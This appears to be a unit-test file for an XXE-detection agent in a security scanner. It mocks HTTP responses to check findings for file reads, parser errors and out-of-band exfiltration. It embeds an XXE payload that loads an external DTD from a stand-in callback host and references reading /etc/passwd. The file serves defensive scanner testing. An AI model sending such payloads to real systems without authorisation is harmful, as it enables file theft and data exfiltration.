"""
Unit tests for XxeAgent — XML External Entity injection (file read, OOB
exfiltration, parser error disclosure). HTTP layer mocked via
dast.agents.xxe_agent._send.
"""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from dast.agents.xxe_agent import XxeAgent
from dast.scanners.active_checks import CheckTarget


def _target(url="https://example.com/api/upload", method="POST", body=None, content_type="application/xml"):
    return CheckTarget(
        method=method,
        url=url,
        headers={"content-type": content_type},
        body=body or '<?xml version="1.0"?><root><name>test</name></root>',
        params=[],
    )


def _resp(status=200, text=""):
    m = MagicMock()
    m.status_code = status
    m.text = text
    return m


class _FakeCollaborator:
    def __init__(self, url=None, hit=False):
        self.url = url
        self._hit = hit

    async def poll(self):
        return self._hit


# ── positive: inline file read ───────────────────────────────────────────────

@pytest.mark.asyncio
async def test_inline_file_read_detected():
    target = _target()

    async def fake_send(client, method, url, headers, body, payload=None):
        if body and "file:///etc/passwd" in body:
            return _resp(200, "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:")
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        findings = await XxeAgent().run(target, MagicMock(), collaborator=None)

    assert len(findings) == 1
    assert findings[0].attack_type == "xxe"
    assert findings[0].cwe == "CWE-611"
    assert "Arbitrary File Read" in findings[0].title
    assert findings[0].bypass_validation is True


# ── positive: parser error discloses XXE processing ─────────────────────────

@pytest.mark.asyncio
async def test_parser_error_disclosure_detected():
    target = _target()

    async def fake_send(client, method, url, headers, body, payload=None):
        return _resp(500, "org.xml.sax.SAXParseException: DTD is disallowed")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        findings = await XxeAgent().run(target, MagicMock(), collaborator=None)

    assert len(findings) >= 1
    assert any("Parser Error Disclosure" in f.title for f in findings)


# ── positive: OOB exfiltration via collaborator ──────────────────────────────

@pytest.mark.asyncio
async def test_oob_exfiltration_confirmed(monkeypatch):
    target = _target()
    collaborator = _FakeCollaborator(url="http://collab.example/abc123", hit=True)

    # xxe_agent imports asyncio locally inside run(), so patch the real
    # asyncio.sleep directly rather than a module attribute that doesn't exist
    # until the function executes. The 3s OOB-wait sleep is the only one hit
    # in this path, so this keeps the test fast without touching timing logic.
    monkeypatch.setattr("asyncio.sleep", AsyncMock(return_value=None))
    # Group name and placeholder must match dast/payloads/xxe.yaml: the OOB
    # group is "oob_dtd" and the collaborator placeholder is bare CALLBACK_URL.
    monkeypatch.setattr(
        "dast.agents.xxe_agent.get_payloads",
        lambda category, group: (
            ['<!DOCTYPE x [<!ENTITY % xxe SYSTEM "CALLBACK_URL/xxe.dtd"> %xxe;]>'] if group == "oob_dtd" else []
        ),
    )

    async def fake_send(client, method, url, headers, body, payload=None):
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        findings = await XxeAgent().run(target, MagicMock(), collaborator=collaborator)

    assert len(findings) == 1
    assert "Out-of-Band Exfiltration" in findings[0].title
    assert findings[0].confirmed is True


# ── regression: real payloads load and the collaborator URL is substituted ───
# Guards against the group-name / placeholder mismatch that silently disabled
# OOB XXE (agent asked for "oob_exfiltration"/"{{CALLBACK_URL}}" while the YAML
# defines "oob_dtd"/"CALLBACK_URL", so no OOB payload was ever sent).

@pytest.mark.asyncio
async def test_oob_real_payloads_substitute_callback_url(monkeypatch):
    target = _target()
    collaborator = _FakeCollaborator(url="http://collab.example/abc123", hit=False)
    monkeypatch.setattr("asyncio.sleep", AsyncMock(return_value=None))

    sent_bodies = []

    async def fake_send(client, method, url, headers, body, payload=None):
        sent_bodies.append(body or "")
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        await XxeAgent().run(target, MagicMock(), collaborator=collaborator)

    # At least one OOB payload from the real xxe.yaml must have been sent with
    # the placeholder replaced by the collaborator URL — and none may still
    # carry the raw CALLBACK_URL token.
    assert any(collaborator.url in body for body in sent_bodies)
    assert not any("CALLBACK_URL" in body for body in sent_bodies)


# ── regression: inline parameter-entity payloads are exercised ────────────────

@pytest.mark.asyncio
async def test_parameter_entity_payloads_are_sent():
    target = _target()
    sent_bodies = []

    async def fake_send(client, method, url, headers, body, payload=None):
        sent_bodies.append(body or "")
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        await XxeAgent().run(target, MagicMock(), collaborator=None)

    # The XInclude variant is unique to the parameter_entity group, so seeing it
    # proves that group is now wired into the inline file-read phase.
    assert any("xi:include" in body.lower() for body in sent_bodies)


# ── negative: clean XML response, no collaborator ────────────────────────────

@pytest.mark.asyncio
async def test_clean_response_no_finding():
    target = _target()

    async def fake_send(client, method, url, headers, body, payload=None):
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        findings = await XxeAgent().run(target, MagicMock(), collaborator=None)

    assert findings == []


# ── negative: GET endpoint that isn't XML is skipped ─────────────────────────

@pytest.mark.asyncio
async def test_non_xml_get_endpoint_skipped():
    target = _target(method="GET", content_type="application/json")

    findings = await XxeAgent().run(target, MagicMock(), collaborator=None)

    assert findings == []


# ── content-type switch on non-XML POST endpoint ─────────────────────────────

@pytest.mark.asyncio
async def test_non_xml_post_endpoint_forces_xml_content_type():
    target = _target(content_type="application/json", body='{"name": "test"}')
    seen_headers = []

    async def fake_send(client, method, url, headers, body, payload=None):
        seen_headers.append(dict(headers))
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        await XxeAgent().run(target, MagicMock(), collaborator=None)

    assert seen_headers
    assert seen_headers[0]["content-type"] == "application/xml"
    # Original target headers must never be mutated (shared across agents).
    assert target.headers["content-type"] == "application/json"
